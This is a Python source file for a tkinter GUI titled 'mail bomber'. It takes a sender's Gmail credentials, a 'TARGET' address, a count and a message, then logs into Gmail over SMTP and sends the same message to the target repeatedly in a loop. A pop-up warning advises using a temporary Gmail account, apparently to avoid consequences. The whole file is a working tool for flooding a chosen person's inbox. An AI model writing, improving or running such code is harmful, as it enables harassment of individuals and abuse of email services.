import tkinter
from tkinter import *
from tkinter import messagebox
from tkinter import ttk
import smtplib, ssl
from time import sleep

root = tkinter.Tk()
root.update()
messagebox.showwarning("carefull","DO NOT USE ORIGINAL GMAIL (create TEMP a mail)")
root.title("mail bomber")
root.geometry("400x300")
root.configure(bg="black")
lable = Label(root,text="enter the email below",font=("Bold",10),bg="black",fg="green")
lable.pack()
entry = Entry(root,font=("bold",10),bg="black",fg="green")
entry.pack()
lable = Label(root,text="enter the password below",font=("Bold",10),bg="black",fg="green")
lable.pack()
entry2 = Entry(root,font=("Bold",10),bg="black",fg="green")
entry2.pack()
lable = Label(root,text="enter the TARGET email below",bg="black",fg="green")
lable.pack()
entry3 = Entry(root,font=("Bold",10),bg="black",fg="green")
entry3.pack()
lable = Label(root,text="enter the number of mails u want to send (must be under 100)",bg="black",fg="green")
lable.pack()
entry4 = Entry(root,font=("Bold",10),bg="black",fg="green")
entry4.pack()
lable = Label(root,text="enter the message you want to send",bg="black",fg="green")
lable.pack()
entry5 = Entry(root,font=("Bold",10),bg="black",fg="green")
entry5.pack()


def send():

    emmail = entry.get()
    password1 = entry2.get()
    rcvr = entry3.get()
    numberofml= int(entry4.get())
    txt = entry5.get()
    i = 0
    try:
        lable = Label(root, text="starting....")
        lable.pack()

        while i< numberofml:
            port = 465  # For SSL
            smtp_server = "smtp.gmail.com"
            sender_email = emmail  # Enter your address
            receiver_email = rcvr  # Enter receiver address
            password = password1
            message = txt

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, message)
                i += 1
                sleep(0.3)
        lable = Label(root, text="done.....")
        lable.pack()







    except Exception as exception:
        root.update()
        messagebox.showerror("error","Exception: {}".format(type(exception).__name__))
        root.update()
        messagebox.showerror("error","Exception message: {}".format(exception))
root.update()





botton = Button(root, text="SUBMIT",bg="black",fg="green", font=("bold", 10),command = send)
botton.pack()

root.mainloop()
